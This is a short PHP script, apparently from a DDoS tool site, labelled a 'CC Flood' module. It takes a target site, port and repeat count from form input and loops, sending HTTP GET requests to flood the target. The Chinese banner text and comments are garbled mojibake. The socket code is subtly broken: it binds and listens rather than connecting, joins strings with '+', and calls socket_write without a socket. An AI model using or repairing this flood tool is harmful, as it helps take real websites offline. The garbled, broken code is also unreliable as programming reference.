<?php
echo "״̬ : ����������.....<br>";
echo "================================================<br>";
echo "  <font color=blue>www.phpddos.com<br>";
echo "  CC Flood ģ��<br>";
echo "  ���ߣ�ybhacker<br>";
echo "  ���棺��������й�����,������ȫ�о����ѧ֮��,�����Ը�!</font><br>";
echo "================================================<br><br>";
error_reporting(E_ALL);  //��ʾ������Ϣ
set_time_limit(0);     //�趨һ����ʽ������ִ�е�����   0 ������ѭ��
ob_implicit_flush();     // ˢ���������
$address = $_POST['site'];  // ��վ��ַ
$port = $_POST['port'];      // �˿�
$dongu = $_POST['dongu'];   //ѭ������
$sayi = 1;   
 
while ( $sayi <= $dongu )   //����asyiС�� ѭ���������� dongu �Ż����ѭ��
{
	if (($sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP)) === false) {
		echo "HaHa\n";
	}
 
	if (socket_bind($sock, $address, $port) === false) {       // ���Ӷ˿�
		echo "HaHa\n";
	}
 
	if (socket_listen($sock, 5) === false) {
		echo "HaHa\n";
	}
		$msg = "HTTP/1.1 GET /\r\nHost:"+$_GET['site']+"\r\nConnection: Keep-Alive\r\n"; 
		socket_write($msg);
		socket_close($sock);
		$sayi++;   // ѭ��һ�� ����sayi ��1 
		echo "Goodbye...".$sayi;   // ���ѭ������
}
?>